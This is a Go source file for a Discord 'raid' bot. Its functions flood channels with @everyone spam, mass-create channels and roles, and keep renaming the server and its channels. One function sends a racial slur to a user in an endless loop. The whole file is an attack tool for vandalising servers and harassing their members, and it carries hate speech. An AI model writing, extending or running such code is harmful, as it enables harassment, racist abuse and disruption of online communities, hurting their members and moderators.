package main

import (
	"math/rand"
	"time"

	"github.com/bwmarrin/discordgo"
)

func sendMsgToMembers(userChannel *discordgo.Channel, s *discordgo.Session) {
	time.Sleep(3 * time.Second)
	for {
		s.ChannelMessageSend(userChannel.ID, "neekeri!")
	}
}

func spamMessages(channelID string, s *discordgo.Session) {
	messages := config.Bot.Raid.Messages
	sendTicker := time.NewTicker(time.Duration(config.Bot.Raid.MessageDelay) * time.Millisecond)

	for {
		select {
		case <-sendTicker.C:
			println("(TICK) Sending msg to channel " + channelID)
			randomIndex := rand.Intn(len(messages))
			_, err := s.ChannelMessageSend(channelID, "@everyone"+messages[randomIndex])

			if err != nil {
				println("error sending msg to chn " + channelID)
			}
		}
	}
}

func createChannels(gid string, spam bool, s *discordgo.Session) (channelIDs []string) {
	channelNames := config.Bot.Raid.Channels.Names
	amount := config.Bot.Raid.Channels.Amount

	var ids []string

	for i := 0; i < amount; i++ {
		randomIndex := rand.Intn(len(channelNames))
		channel, err := s.GuildChannelCreate(gid, channelNames[randomIndex], 0)

		if err != nil {
			println("fail creating channel")
		} else {
			if spam {
				go spamMessages(channel.ID, s)

				if config.Bot.Raid.Channels.Edit.Enable == true {
					go spamChannelEdit(channel.ID, s)
				}

			}
			ids = append(ids, channel.ID)
		}
	}

	return ids
}

func spamRoleCreate(gid string, s *discordgo.Session) {
	roleNames := config.Bot.Raid.Roles.Names
	amount := config.Bot.Raid.Roles.Amount

	editTicker := time.NewTicker(time.Duration(config.Bot.Raid.Roles.Delay) * time.Millisecond)

	for i := 0; i < amount; i++ {
		select {
		case <-editTicker.C:
			println("(TICK) Creating new role")
			randomIndex := rand.Intn(len(roleNames))
			_, err := s.GuildRoleCreate(gid, &discordgo.RoleParams{
				Name: roleNames[randomIndex],
			})

			if err != nil {
				println("error creating new role for gid " + gid)
			}
		}
	}
}
func spamGuildEdit(gid string, s *discordgo.Session) {
	names := config.Bot.Raid.GuildEdit.Names
	editTicker := time.NewTicker(time.Duration(config.Bot.Raid.GuildEdit.Delay) * time.Millisecond)

	for {
		select {
		case <-editTicker.C:
			println("(TICK) Changing guild name")
			randomIndex := rand.Intn(len(names))
			_, err := s.GuildEdit(gid, &discordgo.GuildParams{
				Name: names[randomIndex],
			})

			if err != nil {
				println("error editing channel for gid " + gid)
			}
		}
	}
}

func spamChannelEdit(channelID string, s *discordgo.Session) {
	messages := config.Bot.Raid.Messages
	editTicker := time.NewTicker(time.Duration(config.Bot.Raid.Channels.Edit.Delay) * time.Millisecond)

	for {
		select {
		case <-editTicker.C:
			randomIndex := rand.Intn(len(messages))
			s.ChannelEdit(channelID, &discordgo.ChannelEdit{
				Name: messages[randomIndex],
			})
		}
	}
}
